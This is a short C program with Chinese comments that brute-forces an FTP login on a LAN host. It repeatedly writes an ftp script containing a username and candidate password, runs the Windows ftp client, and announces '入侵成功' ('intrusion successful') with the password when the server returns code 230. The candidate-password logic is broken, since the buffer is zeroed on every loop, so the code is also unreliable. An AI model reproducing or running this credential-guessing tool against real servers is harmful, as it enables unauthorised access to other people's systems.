#include <stdio.h>
#include <stdlib.h>

/*1、生成格式化好的密钥文件
 *2、连接服务器进行比对
 *3、获取结果
 */


void CreatePassFile(char * ip,char * pass)
{
    //生成格式 密钥文件
    FILE * fp2 = fopen("D:\\a.txt","w");
    if(!fp2)
        return;
    //生成文件格式：
    //open 192.168.123.111
    //user
    //user
    //0000001
    //bye


    //fprintf(fp2,"open %s\nuser\nuser\n%sbye",ip,pass);
    fprintf(fp2,"open %s\nuser\nfeng\n%sbye",ip,pass);

    fclose(fp2);

}

int main(void)
{
    //ip地址 192.168.123.111
    //char * ip = "192.168.123.111";
    char * ip = "192.168.123.106";
    //密码：读取文件
//    FILE * fp1=fopen("D:\\pass.txt","r");
//    if(!fp1)
//        return -1;
    char pass[20];
    pass[0]=32;
    while(1)
        //while(!feof(fp1))
    {
        memset(pass,0,20);

        //fgets(pass,20,fp1);
       // printf("%s\n",pass);
        CreatePassFile(ip,pass);

        char buf[1024];
        //memset(buf,0,1024);
        //sprintf(buf,"ftp -n -s:D:\a.txt");
        FILE *fp3 = _popen("ftp -n -s:D:\\a.txt","r");
        if(!fp3)
            return -1;
    //    FILE * fp4 = fopen("D:\\log1.txt","w");
    //    if(!fp4)
    //        return -1;
        while(!feof(fp3))
        {
            memset(buf,0,1024);
            fgets(buf,1024,fp3);
            if(!strncmp("230",buf,3))
            {
                printf("入侵成功！\n");
                printf("密码：%s",pass);
                //break;
                exit(0);
            }
           // fputs(buf,fp4);
        }

    //    fclose(fp4);
        _pclose(fp3);
        pass[0]++;
    }

    //while()

    //fclose(fp1);
    return 0;
}

